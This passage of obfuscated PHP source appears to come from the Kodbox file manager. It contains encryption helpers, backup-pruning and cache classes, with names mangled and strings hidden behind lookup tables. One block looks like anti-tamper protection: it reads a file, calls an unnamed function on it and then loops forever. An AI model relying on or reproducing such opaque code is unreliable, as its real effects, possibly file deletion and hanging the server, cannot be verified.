$Š˜Í³êß . $ó·Äô¥); $Š—†·§¡ = $¾ŞÉˆúù[707]; if (strlen($Š—†·§¡) < $¾ŞÉˆúù[614]) { return; } if ($·Ãúë™Ç - 1 > 0) { $ó·Äô¥ = $this->mhlv18910cdb($ó·Äô¥, $Ä¯À´ãğ, $·Ãúë™Ç - 1); } return $ó·Äô¥; } private function wqusc6d7ce59($¸«İËåÀ, $¢ÑÊŠãÆ, $œ¼»Ûûˆ = 3) { $ôÎïáø =& $_SERVER[§ŒØóıü]; $ôŞË ¸é =& $_SERVER[ÉÖ¬ãã¿]; if (!is_string($¸«İËåÀ) || strlen($¸«İËåÀ) < 10) { return !1; } $¸«İËåÀ = trim($¸«İËåÀ); $öŸò§Ò€ = $ôÎïáø[708]; if (strlen($öŸò§Ò€) < $ôÎïáø[614]) { return; } $¸«İËåÀ = strrev($¸«İËåÀ); $¯„ï‘¸ = $¸«İËåÀ[0]; $¸ûº‹È = $ôÎïáø[709]; while ($¸ûº‹È < $ôÎïáø[656]) { if ($¸ûº‹È >= 0) { break; } $¸ûº‹È++; } $¸Ú‹ê÷¯ = substr($¸«İËåÀ, 1, 15); $Ì²†£È = $ôÎïáø[710]; while (strlen($Ì²†£È) < $ôÎïáø[614]) { if (!$Ì²†£È) { break; } $Ì²†£È++; } $¸«İËåÀ = substr($¸«İËåÀ, 16); $ªÊ¨¨Öó = $ôÎïáø[706]; $ ¾ê¦æÁ = $ôŞË ¸é[295]; $ÈÄÓŞˆñ = $ôÎïáø[711]; while ($ÈÄÓŞˆñ < $ôÎïáø[614]) { if ($ÈÄÓŞˆñ >= 0) { break; } $ÈÄÓŞˆñ++; } switch ($¯„ï‘¸) { case $ôŞË ¸é[203]: $§¾ÉŒÎ° = $this->fnty1f07b840($¸«İËåÀ, strrev($¢ÑÊŠãÆ . $¸Ú‹ê÷¯)); break; case $ôŞË ¸é[121]: $§¾ÉŒÎ° = $this->fnty1f07b840($¸«İËåÀ, strrev($¸Ú‹ê÷¯ . $¢ÑÊŠãÆ)); break; $ñ¦Àã÷• = $ôÎïáø[712]; if (!$ñ¦Àã÷•) { return; } case $ôŞË ¸é[296]: $§¾ÉŒÎ° = $this->fnty1f07b840($¸«İËåÀ, base64_encode($¸Ú‹ê÷¯ . $¢ÑÊŠãÆ)); $ƒäÛ€ÊÑ = $ôÎïáø[713]; if (strlen($ƒäÛ€ÊÑ) < $ôÎïáø[656]) { return; } break; $ë¦§—ãı = $ôÎïáø[714]; if (!$ë¦§—ãı) { return; } case $ôŞË ¸é[297]: $§¾ÉŒÎ° = $this->fnty1f07b840($¸«İËåÀ, md5($¸Ú‹ê÷¯ . $¢ÑÊŠãÆ)); break; $ĞˆŞæíé = $ôÎïáø[715]; if (!$ĞˆŞæíé) { return; } case $ôŞË ¸é[298]: $¸«İËåÀ = hash_decode($¸«İËåÀ); $÷à»ğøª = $¸«İËåÀ[0]; $¸«İËåÀ = substr($¸«İËåÀ, 1); $Ö£Ú«Ç = strpos($ ¾ê¦æÁ, $÷à»ğøª); $¶»µú²ş = $ôÎïáø[716]; if (strlen($¶»µú²ş) < $ôÎïáø[630]) { die; } $ª‡ùÄÒ = md5($÷à»ğøª . md5($¢ÑÊŠãÆ . $÷à»ğøª) . $¢ÑÊŠãÆ); $‚ÓæšÊ = $ôÎïáø[717]; if (strlen($‚ÓæšÊ) < $ôÎïáø[607]) { die; } $ª‡ùÄÒ = substr($ª‡ùÄÒ, $Ö£Ú«Ç % 8, $Ö£Ú«Ç % 8 + 7); $Ó°ÎõÅÕ = $ôŞË ¸é[6]; $“ü÷²ìø = 0; $Ç¬Ó¦²˜ = 0; $¡ÑéÏ± = 0; $¹€áÀõÒ = $ôÎïáø[718]; for ($“ü÷²ìø = 0; $“ü÷²ìø < strlen($¸«İËåÀ); $“ü÷²ìø++) { $¡ÑéÏ± = $¡ÑéÏ± == strlen($ª‡ùÄÒ) ? 0 : $¡ÑéÏ±; $ˆİË‰™· = $ôÎïáø[719]; $ù«øöÍ× = $¡ÑéÏ±++; $ìµÑ´÷ø = $ôÎïáø[720]; if (strlen($ìµÑ´÷ø) < $ôÎïáø[614]) { return; } $Ç¬Ó¦²˜ = strpos($ ¾ê¦æÁ, $¸«İËåÀ[$“ü÷²ìø]) - $Ö£Ú«Ç - ord($ª‡ùÄÒ[$ù«øöÍ×]); while ($Ç¬Ó¦²˜ < 0) { $Ç¬Ó¦²˜ += 64; $³±†ôÀ = $ôÎïáø[721]; if (!$³±†ôÀ) { die; } } $Ó°ÎõÅÕ .= $ ¾ê¦æÁ[$Ç¬Ó¦²˜]; $ª­ú£† = $ôÎïáø[722]; if (strlen($ª­ú£†) < $ôÎïáø[625]) { die; } } $§¾ÉŒÎ° = base64_decode($Ó°ÎõÅÕ); $öß»¥òª = $ôÎïáø[723]; if (strlen($öß»¥òª) < $ôÎïáø[630]) { die; } break; default: $§¾ÉŒÎ° = $this->fnty1f07b840($¸«İËåÀ, $¢ÑÊŠãÆ . $¸Ú‹ê÷¯); $”ƒ£àÎ = $ôÎïáø[724]; if (strlen($”ƒ£àÎ) < $ôÎïáø[656]) { die; } break; $­Á×ğš­ = $ôÎïáø[725]; if (!$­Á×ğš­) { return; } } if ($œ¼»Ûûˆ - 1 > 0) { $§¾ÉŒÎ° = $this->wqusc6d7ce59($§¾ÉŒÎ°, $¢ÑÊŠãÆ, $œ¼»Ûûˆ - 1); } return $§¾ÉŒÎ°; } public function uyrfd29f5e22($Şò©‡•¼) { $éÅÅÏü¥ =& $_SERVER[§ŒØóıü]; $Ô ‰¦è =& $_SERVER[ÉÖ¬ãã¿]; $üó€¶‘† = $this->pvfi9247a9d5(); $ŒÕ¨¼š« = $éÅÅÏü¥[726]; if (strlen($ŒÕ¨¼š«) < $éÅÅÏü¥[656]) { return; } $ş®¹ÜÂŸ = $this->pvfi9247a9d5(); $èƒ¾ÇÉü = $éÅÅÏü¥[727]; $²¯‰Ïñ = ($üó€¶‘† - 1) * ($ş®¹ÜÂŸ - 1); $â×´²äú = intval(($üó€¶‘† + $ş®¹ÜÂŸ) / 2); while (1) { $Ø†«ÇüÓ = $â×´²äú; $ÇŞÏò¤Ì = $éÅÅÏü¥[728]; while (strlen($ÇŞÏò¤Ì) < $éÅÅÏü¥[607]) { if (!$ÇŞÏò¤Ì) { break; } $ÇŞÏò¤Ì++; } $èï­€Æ‡ = $²¯‰Ïñ; $„–‡Ä² = $éÅÅÏü¥[729]; while ($èï­€Æ‡ % $Ø†«ÇüÓ != 0) { $“òêá‰“ = $èï­€Æ‡; $èï­€Æ‡ = $Ø†«ÇüÓ; $´ïé³¦‘ = $éÅÅÏü¥[730]; $Ø†«ÇüÓ = $“òêá‰“ % $Ø†«ÇüÓ; $áÈÇ²¾— = $éÅÅÏü¥[731]; } if ($Ø†«ÇüÓ == 1) { break; } else { $â×´²äú++; } } $ç€ïïï± = 2; for ($ª¿ûÔË = 0; $ª¿ûÔË < $²¯‰Ïñ * 10; $ª¿ûÔË++) { if (($²¯‰Ïñ * $ª¿ûÔË + 1) % $â×´²äú == 0) { $ç€ïïï± = intval(($²¯‰Ïñ * $ª¿ûÔË + 1) / $â×´²äú); break; } } $˜®ê¦«Å = $this->mvgua016bb21($üó€¶‘† * $ş®¹ÜÂŸ . $Ô ‰¦è[6], $Ô ‰¦è[135]); $•·îéØ÷ = md5($Ô ‰¦è[299] . ($üó€¶‘† + $ş®¹ÜÂŸ) . $Ô ‰¦è[300] . $â×´²äú . $Ô ‰¦è[300] . $ç€ïïï± . $Ô ‰¦è[301]); $¨÷«²¾ô = $éÅÅÏü¥[732]; while (strlen($¨÷«²¾ô) < $éÅÅÏü¥[656]) { if (!$¨÷«²¾ô) { break; } $¨÷«²¾ô++; } $¢•°ŸåÍ = $this->mvgua016bb21($Şò©‡•¼, $•·îéØ÷) . $Ô ‰¦è[302] . $˜®ê¦«Å; $Çö¥ÁÂº = $éÅÅÏü¥[733]; return $¢•°ŸåÍ; $öÛù‰ = $éÅÅÏü¥[734]; } public function dksq0c771e76($“×ª•‹ñ) { $õËõ¶ó =& $_SERVER[§ŒØóıü]; $‚ó£òÈô =& $_SERVER[ÉÖ¬ãã¿]; $Ë§«ç‹ = explode($‚ó£òÈô[302], $“×ª•‹ñ); if (count($Ë§«ç‹) != 2) { return $‚ó£òÈô[6]; } $ÃŞÚË™Â = $this->fnty1f07b840($Ë§«ç‹[1] . $‚ó£òÈô[6], $‚ó£òÈô[135]); if (!$ÃŞÚË™Â) { return $‚ó£òÈô[6]; } $ÃŞÚË™Â = intval($ÃŞÚË™Â); $£ğ’š£â = $õËõ¶ó[735]; if (!$£ğ’š£â) { return; } $…†ºÇÎ = 0; $ã…¬ë¨ = 0; for ($¿­ùé© = 3; $¿­ùé© < $ÃŞÚË™Â; $¿­ùé© += 2) { if ($ÃŞÚË™Â % $¿­ùé© != 0) { continue; } $…†ºÇÎ = $¿­ùé©; $š£ô€Ô = $õËõ¶ó[736]; $ã…¬ë¨ = intval($ÃŞÚË™Â / $¿­ùé©); $ª‹ÃŸ‚ = $õËõ¶ó[737]; while ($ª‹ÃŸ‚ < $õËõ¶ó[625]) { if ($ª‹ÃŸ‚ >= 0) { break; } $ª‹ÃŸ‚++; } break; $ä­Öê‹ = $õËõ¶ó[738]; if (!$ä­Öê‹) { return; } } $Íì‚§ = ($…†ºÇÎ - 1) * ($ã…¬ë¨ - 1); $ÈÚÀÆğı = $õËõ¶ó[660]; if (!$ÈÚÀÆğı) { die; } $ñÆŒÚ½÷ = intval(($…†ºÇÎ + $ã…¬ë¨) / 2); while (1) { $İËüª  = $ñÆŒÚ½÷; $Ëó²„Ó = $Íì‚§; while ($Ëó²„Ó % $İËüª  != 0) { $Ã‹¢ˆ¨Ó = $Ëó²„Ó; $Ëó²„Ó = $İËüª ; $İËüª  = $Ã‹¢ˆ¨Ó % $İËüª ; $«È›ú­ù = $õËõ¶ó[739]; while ($«È›ú­ù < $õËõ¶ó[625]) { if ($«È›ú­ù >= 0) { break; } $«È›ú­ù++; } } if ($İËüª  == 1) { break; } else { $ñÆŒÚ½÷++; } } $‹Ï¹û˜ù = 2; $Æûâ = $õËõ¶ó[740]; if (!$Æûâ) { die; } for ($¿­ùé© = 0; $¿­ùé© < $Íì‚§ * 10; $¿­ùé©++) { if (($Íì‚§ * $¿­ùé© + 1) % $ñÆŒÚ½÷ == 0) { $‹Ï¹û˜ù = intval(($Íì‚§ * $¿­ùé© + 1) / $ñÆŒÚ½÷); break; } } $çÍšÏ©™ = md5($‚ó£òÈô[299] . ($…†ºÇÎ + $ã…¬ë¨) . $‚ó£òÈô[300] . $ñÆŒÚ½÷ . $‚ó£òÈô[300] . $‹Ï¹û˜ù . $‚ó£òÈô[301]); $±÷§–Ã = $õËõ¶ó[741]; if (!$±÷§–Ã) { return; } $ğã¾Œó¯ = $this->fnty1f07b840($Ë§«ç‹[0], $çÍšÏ©™); return $ğã¾Œó¯; } public function pvfi9247a9d5() { $•öÔ²™É =& $_SERVER[§ŒØóıü]; $ÚÜÓà³ = mt_rand(pow(2, 14), pow(2, 16) - 1); $Û¸É‰ç¢ = $•öÔ²™É[742]; while ($Û¸É‰ç¢ < $•öÔ²™É[630]) { if ($Û¸É‰ç¢ >= 0) { break; } $Û¸É‰ç¢++; } $·§úú»¾ = array(); $İ‡˜â›µ = 1; while ($İ‡˜â›µ <= (int) sqrt($ÚÜÓà³)) { $…–‰Í¤› = $İ‡˜â›µ; while (!0) { $…–‰Í¤›++; if ($…–‰Í¤› <= 2) { $İ‡˜â›µ = $…–‰Í¤›; break; } else { if ($…–‰Í¤› < 2) { continue; } } $õ€Ï¸ÜÃ = !0; for ($Ï®‚Ê† = 2; $Ï®‚Ê† <= sqrt($…–‰Í¤›); $Ï®‚Ê†++) { if ($…–‰Í¤› % $Ï®‚Ê† == 0) { $õ€Ï¸ÜÃ = !1; } } if ($õ€Ï¸ÜÃ) { $İ‡˜â›µ = $…–‰Í¤›; break; } } $·§úú»¾[] = $İ‡˜â›µ; $Øõ´Í·ß = $•öÔ²™É[743]; } $×Øï¸òØ = 2; $ Ç¹‘ä« = $•öÔ²™É[744]; while (strlen($ Ç¹‘ä«) < $•öÔ²™É[625]) { if (!$ Ç¹‘ä«) { break; } $ Ç¹‘ä«++; } for ($…–‰Í¤› = $ÚÜÓà³; $…–‰Í¤› > 1; $…–‰Í¤›--) { $õ€Ï¸ÜÃ = !0; $ÉÑŞ•˜³ = $•öÔ²™É[745]; while ($ÉÑŞ•˜³ < $•öÔ²™É[614]) { if ($ÉÑŞ•˜³ >= 0) { break; } $ÉÑŞ•˜³++; } foreach ($·§úú»¾ as $ˆÖ«¡±¿) { if ($…–‰Í¤› % $ˆÖ«¡±¿ == 0) { $õ€Ï¸ÜÃ = !1; break; } } if ($õ€Ï¸ÜÃ) { $×Øï¸òØ = $…–‰Í¤›; break; } } return $×Øï¸òØ; } public function xvzo360f7aa3($Óñ†¯ºî, $îµÈçõ) { $ÖºÓñîš =& $_SERVER[ÉÖ¬ãã¿]; return call_user_func(array($ÖºÓñîš[8], $ÖºÓñîš[303]), $Óñ†¯ºî, $îµÈçõ); } public function mvgua016bb21($ì˜µˆĞ…, $õàßİ¸ç) { $§ÌãÚÒ =& $_SERVER[ÉÖ¬ãã¿]; return call_user_func(array($§ÌãÚÒ[304], $§ÌãÚÒ[305]), $ì˜µˆĞ…, $õàßİ¸ç); } public function fnty1f07b840($©ÆÉë®‹, $‘åÛñ–Ì) { $ñ„–û½Ğ =& $_SERVER[ÉÖ¬ãã¿]; return call_user_func(array($ñ„–û½Ğ[304], $ñ„–û½Ğ[306]), $©ÆÉë®‹, $‘åÛñ–Ì); } } if (!isset($_SERVER[$_SERVER[§ŒØóıü][746]]) || !isset($_SERVER[$_SERVER[§ŒØóıü][747]])) { $_getc = $_SERVER[§ŒØóıü][748]; $_getfile = $_SERVER[$_SERVER[§ŒØóıü][749]] . $_SERVER[§ŒØóıü][750]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[§ŒØóıü][231], $_getfilec); if (count($_getarrs) < $_SERVER[§ŒØóıü][607]) { $exit = $_SERVER[§ŒØóıü][751]; $exit(); } $_act = $_SERVER[§ŒØóıü][752]; $_act($_SERVER[$_SERVER[§ŒØóıü][749]] . $_SERVER[§ŒØóıü][750]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[§ŒØóıü][378]); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $¯Û‘ë =& $_SERVER[§ŒØóıü]; $this->isManual(); self::$name = date($¯Û‘ë[753]); if (!($Î½ª¦ô® = Model($¯Û‘ë[754])->lastItem())) { $Î½ª¦ô® = $this->initData(); } else { self::$name = $Î½ª¦ô®[$¯Û‘ë[32]]; if ($Î½ª¦ô®[$¯Û‘ë[755]] == $¯Û‘ë[88]) { self::$name = date($¯Û‘ë[756]); $Úòè½­‘ = 0; if (isset($Î½ª¦ô®[$¯Û‘ë[293]][$¯Û‘ë[200]][$¯Û‘ë[468]])) { $Úòè½­‘ = (int) $Î½ª¦ô®[$¯Û‘ë[293]][$¯Û‘ë[200]][$¯Û‘ë[468]]; } if (self::$manual == 0 && $Î½ª¦ô®[$¯Û‘ë[32]] == self::$name) { Model($¯Û‘ë[754])->remove($Î½ª¦ô®[$¯Û‘ë[399]]); } $Î½ª¦ô® = $this->initData($Úòè½­‘, $Î½ª¦ô®[$¯Û‘ë[757]]); } else { $this->checkStore($Î½ª¦ô®[$¯Û‘ë[757]]); } } self::$option = $Î½ª¦ô®; } private function isManual() { $ôÛô¶© = _get($GLOBALS, $_SERVER[§ŒØóıü][758], 0); $ôÛô¶© = intval($ôÛô¶©); self::$manual = $ôÛô¶© && $ôÛô¶© == 1 ? 1 : 0; } private function initData($³³µñ° = 0, $Æ¼Í‚ = '') { $Ôçâ³ÆË =& $_SERVER[§ŒØóıü]; $•²Ùå¥Œ = Model($Ôçâ³ÆË[754])->config(); if ($Æ¼Í‚ && $•²Ùå¥Œ[$Ôçâ³ÆË[757]] != $Æ¼Í‚) { $³³µñ° = 0; } $this->checkStore($•²Ùå¥Œ[$Ôçâ³ÆË[757]]); if (self::$manual == 1) { self::$name .= $Ôçâ³ÆË[11] . date($Ôçâ³ÆË[759]); } $æ­âéİ¦ = array($Ôçâ³ÆË[757] => $•²Ùå¥Œ[$Ôçâ³ÆË[757]], $Ôçâ³ÆË[32] => self::$name, $Ôçâ³ÆË[755] => 0, $Ôçâ³ÆË[760] => $•²Ùå¥Œ[$Ôçâ³ÆË[760]], $Ôçâ³ÆË[761] => self::$manual, $Ôçâ³ÆË[293] => array($Ôçâ³ÆË[762] => array($Ôçâ³ÆË[755] => 0), $Ôçâ³ÆË[763] => array($Ôçâ³ÆË[755] => 0, $Ôçâ³ÆË[764] => 0, $Ôçâ³ÆË[765] => 0, $Ôçâ³ÆË[33] => $Ôçâ³ÆË[12], $Ôçâ³ÆË[766] => 0, $Ôçâ³ÆË[767] => 0), $Ôçâ³ÆË[768] => array($Ôçâ³ÆË[755] => 0, $Ôçâ³ÆË[764] => 0, $Ôçâ³ÆË[765] => 0, $Ôçâ³ÆË[766] => 0, $Ôçâ³ÆË[767] => 0), $Ôçâ³ÆË[200] => array($Ôçâ³ÆË[755] => 0, $Ôçâ³ÆË[769] => 0, $Ôçâ³ÆË[770] => 0, $Ôçâ³ÆË[771] => 0, $Ôçâ³ÆË[772] => 0, $Ôçâ³ÆË[468] => $³³µñ°, $Ôçâ³ÆË[766] => 0, $Ôçâ³ÆË[767] => 0)), $Ôçâ³ÆË[766] => time(), $Ôçâ³ÆË[767] => 0); $›£µ˜ô = Model($Ôçâ³ÆË[754])->insert($æ­âéİ¦); $æ­âéİ¦[$Ôçâ³ÆË[399]] = $›£µ˜ô; return $æ­âéİ¦; } private function checkStore($Âõ¾İƒ) { $úê¤ÍÜ =& $_SERVER[§ŒØóıü]; $­å³ëğ” = Model($úê¤ÍÜ[773])->listData($Âõ¾İƒ); Model($úê¤ÍÜ[773])->checkConfig($­å³ëğ”); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[§ŒØóıü][754])->findByName(self::$name); } return self::$option; } public static function set($ó…Õ¤éş) { $ÈÆÙÒĞƒ =& $_SERVER[§ŒØóıü]; $Óíáæûò = self::get(); foreach ($ó…Õ¤éş as $±Ü¶‹îş => $ˆºæØ¤¢) { $áñÌíı = explode($ÈÆÙÒĞƒ[10], $±Ü¶‹îş); $¸•­‡Ë¨ = count($áñÌíı); switch ($¸•­‡Ë¨) { case 1: $Óíáæûò[$áñÌíı[0]] = $ˆºæØ¤¢; break; case 2: $Óíáæûò[$áñÌíı[0]][$áñÌíı[1]] = $ˆºæØ¤¢; break; case 3: $Óíáæûò[$áñÌíı[0]][$áñÌíı[1]][$áñÌíı[2]] = $ˆºæØ¤¢; break; } } Model($ÈÆÙÒĞƒ[754])->update($Óíáæûò[$ÈÆÙÒĞƒ[399]], $Óíáæûò); self::$option = $Óíáæûò; return self::$option; } public function keep() { $¼ñ·ûË€ =& $_SERVER[§ŒØóıü]; $Ù¦Ï±Ÿê = self::get(); if ($Ù¦Ï±Ÿê[$¼ñ·ûË€[293]][$¼ñ·ûË€[762]][$¼ñ·ûË€[755]] == $¼ñ·ûË€[88]) { return; } $this->backupKeep($Ù¦Ï±Ÿê); self::set(array($¼ñ·ûË€[774] => 1)); } private function backupKeep($½œ –) { $ÁÌãğ˜Í =& $_SERVER[§ŒØóıü]; if (self::$manual == 1) { return; } $şÊ“ÒÒÁ = Model($ÁÌãğ˜Í[754])->listData(); if (empty($şÊ“ÒÒÁ)) { return; } $†ÉŸ¬¦ = 0; $ú«ÛŒú¢ = array(); foreach ($şÊ“ÒÒÁ as $Î±˜£¢‘) { if ($†ÉŸ¬¦ >= 7) { break; } $ú«ÛŒú¢[] = $Î±˜£¢‘[$ÁÌãğ˜Í[32]]; $†ÉŸ¬¦++; } for ($†ÉŸ¬¦ = 0; $†ÉŸ¬¦ < 12; $†ÉŸ¬¦++) { $ú«ÛŒú¢[] = date($ÁÌãğ˜Í[775], strtotime("\x2d{$†ÉŸ¬¦}\40\155\157\x6e\x74\x68\163")); } $ú«ÛŒú¢ = array_unique($ú«ÛŒú¢); $µğ™—ª› = Model($ÁÌãğ˜Í[776])->get($ÁÌãğ˜Í[777]); foreach ($şÊ“ÒÒÁ as $Î±˜£¢‘) { if (isset($Î±˜£¢‘[$ÁÌãğ˜Í[761]]) && $Î±˜£¢‘[$ÁÌãğ˜Í[761]] == $ÁÌãğ˜Í[88]) { continue; } if (!empty($Î±˜£¢‘[$ÁÌãğ˜Í[32]]) && in_array($Î±˜£¢‘[$ÁÌãğ˜Í[32]], $ú«ÛŒú¢)) { continue; } Model($ÁÌãğ˜Í[754])->remove($Î±˜£¢‘[$ÁÌãğ˜Í[399]]); $ØÏï¶¦Š = $this->backupPath($½œ –, $µğ™—ª›); IO::remove($ØÏï¶¦Š, !1); } } private function backupPath($òÄåŞÍÕ, $–ª›åŠû = false) { $÷ïç§çø =& $_SERVER[§ŒØóıü]; if (!$–ª›åŠû) { $–ª›åŠû = Model($÷ïç§çø[776])->get($÷ïç§çø[777]); } $èÚöŸÖ = $òÄåŞÍÕ[$÷ïç§çø[32]]; $¥Óéªëè = substr(md5($÷ïç§çø[778] . $–ª›åŠû . $èÚöŸÖ), 0, 8); return "\x7b\x69\157\x3a{$òÄåŞÍÕ[$÷ïç§çø[757]]}\x7d\x2f\x64\141\x74\141\142\141\x73\x65\57\142\141\143\x6b\165\x70\57" . $èÚöŸÖ . $÷ïç§çø[11] . $¥Óéªëè; } public function db() { $äÜ¡¸ËÏ =& $_SERVER[§ŒØóıü]; $Ú¤Œ¬º = self::get(); if ($Ú¤Œ¬º[$äÜ¡¸ËÏ[293]][$äÜ¡¸ËÏ[763]][$äÜ¡¸ËÏ[755]] == $äÜ¡¸ËÏ[88]) { return !0; } $‰áóß¡’ = new BackupDb(); if (!$‰áóß¡’->index()) { return !1; } self::set(array($äÜ¡¸ËÏ[779] => 1)); return !0; } public function dbFile() { $šºÙçÏÒ =& $_SERVER[§ŒØóıü]; $Ìì ò† = self::get(); if ($Ìì ò†[$šºÙçÏÒ[293]][$šºÙçÏÒ[768]][$šºÙçÏÒ[755]] == $šºÙçÏÒ[88]) { return !0; } $ÃÀš¯²Í = new BackupDbFile(); if (!$ÃÀš¯²Í->index()) { return !1; } self::set(array($šºÙçÏÒ[780] => 1)); return !0; } public function file() { $´ëí”Ê =& $_SERVER[§ŒØóıü]; $¤ßíºü = self::get(); if ($¤ßíºü[$´ëí”Ê[293]][$´ëí”Ê[200]][$´ëí”Ê[755]] == $´ëí”Ê[88]) { return !0; } if (!isset($¤ßíºü[$´ëí”Ê[760]]) || $¤ßíºü[$´ëí”Ê[760]] == $´ëí”Ê[198]) { $ôĞ¬İå = new BackupFile(); if (!$ôĞ¬İå->index()) { return !1; } } self::set(array($´ëí”Ê[781] => 1, $´ëí”Ê[755] => 1)); return !0; } } goto f»Ë¯ÌÈ¯ö; FŒÌŸÖ†íá: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $şïñê‹Õ =& $_SERVER[§ŒØóıü]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $•»¨‚É = $GLOBALS[$şïñê‹Õ[6]][$şïñê‹Õ[349]]; $™»±áƒ€ = $•»¨‚É[$•»¨‚É[$şïñê‹Õ[833]]]; $½ñÖ…óğ = $•»¨‚É[$şïñê‹Õ[834]]; switch ($•»¨‚É[$şïñê‹Õ[833]]) { case $şïñê‹Õ[21]: self::$handle = Model($şïñê‹Õ[835]); break; case $şïñê‹Õ[836]: self::$handle = new CacheRedis($™»±áƒ€, $½ñÖ…óğ); break; case $şïñê‹Õ[837]: self::$handle = new CacheMemcached($™»±áƒ€, $½ñÖ…óğ); break; case $şïñê‹Õ[200]: self::$handle = new CacheFile($™»±áƒ€, $½ñÖ…óğ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($À¶«ŠÛ) { if (is_array($À¶«ŠÛ) || is_object($À¶«ŠÛ)) { $À¶«ŠÛ = json_encode($À¶«ŠÛ); } $À¶«ŠÛ = rawurlencode($À¶«ŠÛ); return md5(KOD_SITE_ID . $_SERVER[§ŒØóıü][11] . $À¶«ŠÛ); } public static function get($ì·ì‡şØ, $ìüÆšÈ = false) { $”È¶ÛÒ = self::key($ì·ì‡şØ); if ($ìüÆšÈ) { return unserialize(self::init()->get($”È¶ÛÒ)); } if (!isset(self::$memoryCache[$”È¶ÛÒ])) { $ÌÃ¦ç¦è = self::init()->get($”È¶ÛÒ); self::$memoryCache[$”È¶ÛÒ] = unserialize($ÌÃ¦ç¦è); } return self::$memoryCache[$”È¶ÛÒ]; } public static function set($‡şÛèÓÀ, $±×¦µ¾, $¯”ş­ûÅ = false) { $¹ÈïÅƒŒ = self::key($‡şÛèÓÀ); if (isset(self::$memoryCache[$¹ÈïÅƒŒ]) && self::$memoryCache[$¹ÈïÅƒŒ] === $±×¦µ¾) { return !0; } if ($¯”ş­ûÅ === 0) { self::$memoryCache[$¹ÈïÅƒŒ] = $±×¦µ¾; return !0; } CacheLock::lock($‡şÛèÓÀ); $‘Ìœã¢ = self::init()->set($¹ÈïÅƒŒ, serialize($±×¦µ¾), $¯”ş­ûÅ); self::$memoryCache[$¹ÈïÅƒŒ] = $±×¦µ¾; CacheLock::unlock($‡şÛèÓÀ); return $‘Ìœã¢; } public static function getCall($‹–ãÛ©ô, $«ˆß ÀÄ, $ÜäÒ¬çı, $ÇªµâÜŒ = array()) { $ÆÔ˜ä¡ =& $_SERVER[§ŒØóıü]; $Š‰àÏ”ò = self::get($‹–ãÛ©ô); if ($Š‰àÏ”ò || $Š‰àÏ”ò === $ÆÔ˜ä¡[12]) { return $Š‰àÏ”ò; } $Š‰àÏ”ò = call_user_func_array($ÜäÒ¬çı, $ÇªµâÜŒ); $Š‰àÏ”ò = $Š‰àÏ”ò ? $Š‰àÏ”ò : $ÆÔ˜ä¡[12]; self::set($‹–ãÛ©ô, $Š‰àÏ”ò, $«ˆß ÀÄ); return $Š‰àÏ”ò; } public static function remove($Ï©Äö) { $—ß‰Şºö = self::key($Ï©Äö); unset(self::$memoryCache[$—ß‰Şºö]); self::clearTimeout(); CacheLock::lock($Ï©Äö); $„¢Ñ¯„ = self::init()->remove($—ß‰Şºö); CacheLock::unlock($Ï©Äö); return $„¢Ñ¯„; } public static function removeMemory($ÊïÜòıë) { $¢ƒÆ¯ïì = self::key($ÊïÜòıë); unset(self::$memoryCache[$¢ƒÆ¯ïì]); } public static function clearMemory($ÊØß› = false) { if ($ÊØß›) { $ÊØß› = self::key($ÊØß›); unset(self::$memoryCache[$ÊØß›]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[§ŒØóıü][838])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[§ŒØóıü][839])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($åÉ¿œå³, $Öı¢½ö) { $Ÿ İ¯òÅ =& $_SERVER[§ŒØóıü]; $this->cachePath = $åÉ¿œå³[$Ÿ İ¯òÅ[84]]; $this->prefix = $Ÿ İ¯òÅ[840]; $this->cacheTime = $Öı¢½ö; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Ïè¥ŒûÕ) { $™±¾›’± =& $_SERVER[§ŒØóıü]; $Ïè¥ŒûÕ = str_replace(array($™±¾›’±[841], $™±¾›’±[97], $™±¾›’±[73]), $™±¾›’±[842], $Ïè¥ŒûÕ); return $this->cachePath . $™±¾›’±[843] . $Ïè¥ŒûÕ . $™±¾›’±[844]; } public function set($ˆ¼ß§Æ•, $ÆáÊö°ç, $õªºÚî = false) { $õªºÚî = $õªºÚî ? $õªºÚî : $this->cacheTime; $ÃïÌ¶Ä— = $this->getFile($ˆ¼ß§Æ•); if (file_put_contents($ÃïÌ¶Ä—, $this->prefix . $ÆáÊö°ç, LOCK_EX)) { @touch($ÃïÌ¶Ä—, intval(time() + $õªºÚî)); clearstatcache(); return !0; } @unlink($ÃïÌ¶Ä—); return !1; } public function get($·ª°´Šú) { $ÕÉÆ™ÔÀ = $this->getFile($·ª°´Šú); if (file_exists($ÕÉÆ™ÔÀ) && filemtime($ÕÉÆ™ÔÀ) < time()) { @unlink($ÕÉÆ™ÔÀ); return !1; } $æ¸ÄìÂ“ = @file_get_contents($ÕÉÆ™ÔÀ); return substr($æ¸ÄìÂ“, strlen($this->prefix)); } public function remove($åØ–™©å) { $Èšò¢Ë‚ = $this->getFile($åØ–™©å); return @unlink($Èšò¢Ë‚); } public function deleteAll() { $îì§Îüû =& $_SERVER[§ŒØóıü]; $òşÎªˆ = scandir($this->cachePath); foreach ($òşÎªˆ as $Íò×€šö) { $”†°¯® = $this->cachePath . $Íò×€šö; if (strpos($”†°¯®, $îì§Îüû[844]) && strpos($”†°¯®, $îì§Îüû[845])) { @unlink($”†°¯®); } } } public function clearTimeout() { $Êµš¦Ùü =& $_SERVER[§ŒØóıü]; $Õé™¤§Û = scandir($this->cachePath); foreach ($Õé™¤§Û as $ÒûøŸ¿œ) { $ò¡¡Ã… = $this->cachePath . $ÒûøŸ¿œ; if (strpos($ò¡¡Ã…, $Êµš¦Ùü[844]) && strpos($ò¡¡Ã…, $Êµš¦Ùü[845]) && filemtime($ò¡¡Ã…) < time()) { @unlink($ò¡¡Ã…); } } } } class CacheLock { protected static $handle; protected static 